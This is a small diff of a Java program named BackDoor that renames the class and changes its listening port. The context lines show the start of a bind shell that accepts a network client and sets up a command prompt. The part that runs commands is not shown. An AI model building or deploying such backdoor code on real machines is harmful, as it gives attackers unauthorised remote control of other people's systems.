@@ -9,13 +9,13 @@ import java.io.OutputStreamWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
 
-public class BackDoor_Shell {
+public class BackDoor {
 
 	public static void main(String[] args) {
 		// TODO Auto-generated method stub
 
 		try {
-			ServerSocket server=new ServerSocket(2000);
+			ServerSocket server=new ServerSocket(2001);
 			Socket client=server.accept();
 			String workingDir=System.getProperty("user.dir");
 			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
@@ -56,7 +56,6 @@ public class BackDoor_Shell {
 		
 
 	}
-
 	}
 
 }
